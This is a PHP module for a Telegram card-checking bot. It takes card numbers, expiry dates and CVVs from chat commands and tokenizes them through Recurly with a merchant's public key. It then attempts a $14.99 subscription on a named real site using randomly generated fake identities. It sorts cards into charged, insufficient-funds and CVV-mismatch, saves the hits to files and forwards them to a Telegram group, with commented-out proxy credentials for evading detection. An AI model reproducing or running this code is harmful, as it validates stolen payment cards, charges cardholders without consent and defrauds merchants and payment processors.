<?php

#----------------------------------------------------------------------#
#   GATE: RECURLY CHARGE ($14.99)  ( /rc )                             #
#   SITE: https://subs.huracanapps.com/subscription                    #
#----------------------------------------------------------------------#
$gate = "RECURLY CHARGE ($14.99)";


if ((strpos($message, "/rcc") === 0) || (strpos($message, "!rcc") === 0)){
  
  if (in_array($userId, $premium_users) === false){
 	sendMessage($chatId,$premium_unauth_msg, $message_id);
	return;
	}
sendaction($chatId, "typing");
error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('America/Buenos_Aires');

if ($_SERVER['REQUEST_METHOD'] == "POST")   { extract($_POST); }
elseif ($_SERVER['REQUEST_METHOD'] == "GET") { extract($_GET); }


  
//================ [ INCLUDE FUNCTIONS ] ===============//
//include "./Tools/functions/usefun.php";
//include "./Tools/functions/flagsgen.php";



//================ [ EXPLODE & LISTA ] ===============//
$lista = substr($message, 4);
$lista = preg_replace('/[^0-9]+/', ' ', $lista);
$lista = ltrim($lista);
    $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
  
$strlen1 = strlen($mes);
$ano1 = $ano;
    if(strlen($strlen1 > 2)) {
    $ano = $cvv; 
    $cvv = $mes;
    $mes = $ano1;   }
  
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 4) $ano = substr($ano, 2, 2);
//if (strlen($ano) == 2) $ano = "20$ano";

$lista = "$cc|$mes|$ano|$cvv";



//==================[BIN LOOK-UP]======================//
$bin = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
curl_close($ch);
$bank = urlencode(GetStr($fim, '"bank":{"name":"', '"'));
$brand = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$level = GetStr($fim, '"brand":"', '"');
$name = GetStr($fim, '"name":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
//$benk = ucwords("$bank");

$bindata1 = " $bin | $brand | $type | $level | .$bank | $name ($emoji) ";
$bininfo = "$brand | $type | $level";
$cuntry = "$name ($emoji)";


//=============== [ Random User Details ] ==============//
$get = file_get_contents('https://random-data-api.com/api/users/random_user');
preg_match_all("(\"first_name\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last_name\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"street_address\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"zip_code\":\"(.*)\")siU", $get, $matches1);
$zip = $matches1[1][0];
preg_match_all("(\"country\":\"(.*)\")siU", $get, $matches1);
$country = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email1 = $matches1[1][0];

$serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email = "".$name.".".$last."2".rand(000,999)."@".$serv_rnd."";
//$username = "".$name."".$last."".rand(1000,9999)."";
$pass = "".$name."@".rand(1000,9999)."";
$phone = "917288".rand(1111,9999)."";
$date = ''.date("20y-m-d").'';
if(strlen($zip) > 5) $zip = substr($zip, 0, 5);

$rand = " $name - $last - $street - $city - $zip - $state - $email - $country - $date";



/*
//=================== [Proxys Section] ==================//
$Websharegay = rand(0,250);
$rp1 = array(
    1 => 'uaezfmea-rotate:72i7o09hmdar',
    2 => 'hdtjmutw-rotate:0su7kp9bw345',
    3 => 'yltqfkkn-rotate:5pihdk12sagg',
    4 => 'kybbxwap-rotate:tzx8anpvra0n',
    ); 
    $rotate = $rp1[array_rand($rp1)];
////==============[Proxy Section]===============////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)) { $ip = "Live! ✅"; }
if (empty($ip1)) { $ip = "Dead! ❌"; }
*/

$ip = "Live! ✅";   




//=======================[1 REQ]==================================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://api.recurly.com/js/v1/token');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.recurly.com',
'accept: */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://api.recurly.com',
'referer: https://api.recurly.com/js/v1/field.html',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'first_name='.$name.'&last_name='.$last.'&number='.$cc.'&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=en-GB&browser[referrer_url]=https%3A%2F%2Fsubs.huracanapps.com%2Finstatrack%2F&browser[screen_height]=864&browser[screen_width]=1536&browser[time_zone_offset]=-330&browser[user_agent]=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F40.0.2214.93%20Safari%2F537.36&month='.$mes.'&year='.$ano.'&cvv='.$cvv.'&version=4.21.1&key=ewr1-sZ5kHl1Ew6Vr7o0bYpMFGc&deviceId=u9b5OE5eAISNkySM&sessionId=5kFTbV3vm7jnsSCF&instanceId=28j75ok7FBF5q9px');
$res1 = curl_exec($ch);
$id = trim(strip_tags(getStr($res1,'"id":"','"')));
$msg1 = trim(strip_tags(getStr($res1,'"message":"','"')));


if (strpos($res1, 'error')){
$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
  curl_close($ch);

    sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.$res1.'</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>', $message_id);
    return;
}


//=======================[2 REQ]==================================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'resi.infiniteproxies.com:1111');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'infproxy_sorav7704:gCO27BE5scRjCrAy');
curl_setopt($ch, CURLOPT_URL, 'https://subtrack-huracan.appycnt.com/rec/create-subscription-no-user');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: subtrack-huracan.appycnt.com';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: text/plain;charset=UTF-8';
$headers[] = 'origin: https://subs.huracanapps.com';
$headers[] = 'referer: https://subs.huracanapps.com/instatrack/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: cross-site';
$headers[] = 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"plan_id":"instatrack_monthly_15","token_id":"'.$id.'","email":"'.$email.'","attribution":{"country_code":"US","fbc":"fb.1.1000.42","event_source_url":"https://subs.huracanapps.com/instatrack/","client_user_agent":"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36","client_ip_address":"45.134.143.'.rand(111,999).'"}}');
$res2 = curl_exec($ch);


$msg = trim(strip_tags(getStr($res2,'"error":"','"')));
//$msg = trim(strip_tags(getStr($result2,'"message":"','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
curl_close($ch);



//==================[Responses]======================//

if ((strpos($res2, '"state":"active"')) || (strpos($res2, '"activated_at":'))){
$tmsg = '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b>CHARGED $14.99</b> ✅%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>Transaction Successed.</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>';

sendMessage($chatId, ''.$tmsg.'', $message_id);
file_put_contents('Others/Save/rc_ccc.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);

$fmsg = '<b>╭─━━━━━━━━━━━━━━━━─╮%0A      BOT%0A╰─━━━━━━━━━━━━━━━━─╯</b>%0A%0A'.$tmsg.'';
sendMsg('-4077073881', "$fmsg");
sendMsg('-4077073881', "$fmsg");
}

elseif ((strpos($res2, 'insufficient funds')) || (strpos($res2, 'insufficient funds in your account.'))){
$tmsg = '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b>INSUFFICIENT</b> ✅%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>Your transaction was declined due to insufficient funds in your account.</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>';

sendMessage($chatId, ''.$tmsg.'', $message_id);
file_put_contents('Others/Save/insuff.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);

$fmsg = '<b>╭─━━━━━━━━━━━━━━━━─╮%0A      BOT%0A╰─━━━━━━━━━━━━━━━━─╯</b>%0A%0A'.$tmsg.'';
sendMsg('-4077073881', "$fmsg");
}


elseif ((strpos($res2, 'The security code you entered does not match.')) || (strpos($res2, 'NANA'))){
$tmsg = '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b>CCN MATCHED</b> ✅%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.$msg.'</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>';

sendMessage($chatId, ''.$tmsg.'', $message_id);
file_put_contents('Others/Save/ccn.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);

$fmsg = '<b>╭─━━━━━━━━━━━━━━━━─╮%0A      BOT%0A╰─━━━━━━━━━━━━━━━━─╯</b>%0A%0A'.$tmsg.'';
sendMsg('-4077073881', "$fmsg");
}

elseif(strpos($res2,  '"error"')) {
sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.$msg.'</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>', $message_id);
}

else{
sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.$res2.'</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>', $message_id);
}




curl_close($ch);
unlink("cookies.txt");
}

//====================[ RECURLY AUTH 60$ ]=====================//

?>